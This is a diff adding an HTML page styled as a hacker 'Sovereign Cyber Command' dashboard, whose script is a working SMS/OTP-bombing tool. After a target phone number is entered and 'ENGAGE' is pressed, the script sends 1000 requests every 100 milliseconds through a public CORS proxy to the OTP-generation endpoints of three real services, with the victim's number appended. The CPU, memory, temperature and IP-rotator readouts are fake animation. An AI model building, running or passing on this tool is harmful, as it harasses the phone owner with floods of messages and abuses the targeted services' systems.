@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AETERNA GLOBAL | Sovereign Cyber Command</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root { --main: #ff0033; --accent: #00f2ff; --bg: #050505; --panel: rgba(15, 15, 15, 0.95); }
+        body { background: var(--bg); color: #fff; font-family: 'Share Tech Mono', monospace; margin: 0; overflow-x: hidden; }
+        
+        /* Cyber Background Effect */
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
+
+        /* Navigation Bar */
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; background: rgba(0,0,0,0.8); border-bottom: 1px solid var(--main); position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; letter-spacing: 5px; color: var(--main); text-shadow: 0 0 10px var(--main); font-size: 1.5em; }
+        .nav-links span { margin: 0 15px; font-size: 0.8em; color: #888; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .nav-links span:hover { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
+
+        /* Main Dashboard Layout */
+        .dashboard { display: grid; grid-template-columns: 300px 1fr 300px; gap: 20px; padding: 30px; height: calc(100vh - 120px); }
+
+        /* Sidebar Panels */
+        .panel { background: var(--panel); border: 1px solid #222; border-radius: 5px; padding: 20px; display: flex; flex-direction: column; }
+        .panel-header { font-size: 0.7em; color: var(--main); border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; font-weight: bold; letter-spacing: 2px; }
+
+        /* Module Grid */
+        .module-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; overflow-y: auto; }
+        .mod-item { background: #000; border: 1px solid #333; padding: 10px; font-size: 0.6em; text-align: center; cursor: pointer; transition: 0.2s; color: #666; }
+        .mod-item.active { border-color: var(--main); color: var(--main); box-shadow: inset 0 0 10px rgba(255,0,0,0.2); }
+
+        /* Central Control */
+        .center-control { display: flex; flex-direction: column; gap: 20px; }
+        .target-input { width: 100%; background: #000; border: 1px solid var(--main); padding: 25px; color: var(--accent); font-size: 2em; text-align: center; font-family: 'Orbitron'; outline: none; border-radius: 10px; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
+        
+        /* Stats Table */
+        table { width: 100%; border-collapse: collapse; font-size: 0.7em; color: #888; }
+        td { padding: 8px 0; border-bottom: 1px solid #111; }
+        .val { color: var(--accent); text-align: right; }
+
+        .btn-execute { background: var(--main); color: #fff; border: none; padding: 30px; border-radius: 10px; font-family: 'Orbitron'; font-size: 1.5em; font-weight: 900; cursor: pointer; letter-spacing: 10px; transition: 0.3s; box-shadow: 0 0 40px rgba(255,0,51,0.4); }
+        .btn-execute:hover { transform: scale(1.02); filter: brightness(1.2); }
+
+        /* Terminal Window */
+        .terminal { background: #000; flex-grow: 1; border-radius: 5px; border: 1px solid #222; padding: 15px; font-size: 0.7em; color: #00ff41; overflow-y: auto; line-height: 1.5; }
+        
+        .status-dot { height: 8px; width: 8px; background-color: var(--accent); border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 5px var(--accent); }
+    </style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<div class="navbar">
+    <div class="logo">AETERNA GLOBAL</div>
+    <div class="nav-links">
+        <span>Network Control</span>
+        <span>Cyber Defense</span>
+        <span>Database Penetration</span>
+        <span>Identity Cloak</span>
+    </div>
+    <div style="font-size: 0.6em; color: var(--accent);">SEC_LEVEL: 10 (SOVEREIGN)</div>
+</div>
+
+<div class="dashboard">
+    <div class="panel">
+        <div class="panel-header">REAL-TIME THREAT INTEL</div>
+        <table>
+            <tr><td>System Integrity</td><td class="val">100%</td></tr>
+            <tr><td>Encryption Status</td><td class="val">AES-512</td></tr>
+            <tr><td>Ghost Proxy</td><td class="val">ONLINE</td></tr>
+            <tr><td>Target CPU Load</td><td id="v-cpu" class="val">0.0%</td></tr>
+            <tr><td>Memory Saturation</td><td id="v-ram" class="val">0.1 GB</td></tr>
+            <tr><td>Thermals</td><td id="v-tmp" class="val">31.0°C</td></tr>
+        </table>
+        <div class="panel-header" style="margin-top:20px;">SYSTEM LOGS</div>
+        <div id="mini-log" style="font-size: 0.5em; color: #444;">> Waiting for process...</div>
+    </div>
+
+    <div class="center-control">
+        <input type="number" id="targetNum" class="target-input" placeholder="000.000.000">
+        <div class="module-grid" id="mod-list">
+            </div>
+        <button class="btn-execute" onclick="ignite()">ENGAGE</button>
+        <div class="terminal" id="main-term">> Welcome to AETERNA Sovereign Hub. All protocols standby.</div>
+    </div>
+
+    <div class="panel">
+        <div class="panel-header">GLOBAL NODE STATUS</div>
+        <div id="nodes" style="font-size: 0.6em; color: #555;">
+            <p><span class="status-dot"></span>RU-MOSCOW: ACTIVE</p>
+            <p><span class="status-dot"></span>CN-BEIJING: ACTIVE</p>
+            <p><span class="status-dot" style="background:orange"></span>US-OHIO: LATENCY</p>
+            <p><span class="status-dot"></span>DE-FRANKFURT: ACTIVE</p>
+        </div>
+        <div class="panel-header" style="margin-top:20px;">IP ROTATOR</div>
+        <div id="ip-mask" style="font-size: 0.8em; color: var(--accent); text-align: center;">MASKED: 103.XX.XX.XX</div>
+    </div>
+</div>
+
+<script>
+    // Module list
+    const mods = ["WA_CRASH", "DB_VOID", "RAM_EATER", "UI_JAMMER", "SSL_BYPASS", "GHOST_IP", "SOCKET_RIP", "SYNC_LOCK", "OOM_KILL", "BUFFER_BOOM", "KERNEL_RIP", "CORE_STRESS", "SIGNAL_DROP", "CACHE_NUKE", "PROXY_V6", "ZENITH_V3"];
+    let activeMods = [];
+    const modListEl = document.getElementById('mod-list');
+
+    mods.forEach(m => {
+        const d = document.createElement('div');
+        d.className = 'mod-item';
+        d.innerText = m;
+        d.onclick = () => {
+            if(activeMods.includes(m)) { activeMods = activeMods.filter(x => x !== m); d.classList.remove('active'); }
+            else { activeMods.push(m); d.classList.add('active'); }
+        };
+        modListEl.appendChild(d);
+    });
+
+    function log(m, c = "") {
+        const t = document.getElementById('main-term');
+        t.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > <span style="color:${c}">${m}</span>`;
+        t.scrollTop = t.scrollHeight;
+    }
+
+    // IP Rotation Simulation
+    setInterval(() => {
+        const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.XXX.XXX`;
+        document.getElementById('ip-mask').innerText = `MASKED: ${ip}`;
+    }, 5000);
+
+    async function ignite() {
+        const n = document.getElementById('targetNum').value;
+        if(!n || activeMods.length < 3) return alert("Select target and at least 3 modules!");
+
+        log("AUTHORIZING GLOBAL SOVEREIGN PROTOCOL...", "white");
+        log(`TARGET ACQUIRED: +${n}`, "yellow");
+
+        let cpu = 0, ram = 0.1, tmp = 31;
+
+        setInterval(() => {
+            const apis = ['https://api.evermos.com/api/v1/auth/otp?phone=', 'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=', 'https://m.redbus.id/api/getOtp?phone='];
+
+            // Extreme Load: 1000 Packets per 100ms
+            for(let i=0; i<1000; i++) {
+                const api = apis[Math.floor(Math.random() * apis.length)];
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", `https://api.allorigins.win/get?url=${encodeURIComponent(api + n)}&s=${Math.random()}`, true);
+                xhr.send();
+            }
+            log("BURST: 1000 Packets Sent via Proxy Chain.", "red");
+
+            // Dashboard Update
+            if(cpu < 99) cpu += 1.8;
+            if(ram < 4.5) ram += 0.08;
+            if(tmp < 75) tmp += 0.4;
+            document.getElementById('v-cpu').innerText = `${cpu.toFixed(1)}%`;
+            document.getElementById('v-ram').innerText = `${ram.toFixed(2)} GB`;
+            document.getElementById('v-tmp').innerText = `${tmp.toFixed(1)}°C`;
+        }, 100);
+    }
+</script>
+</body>
+</html>
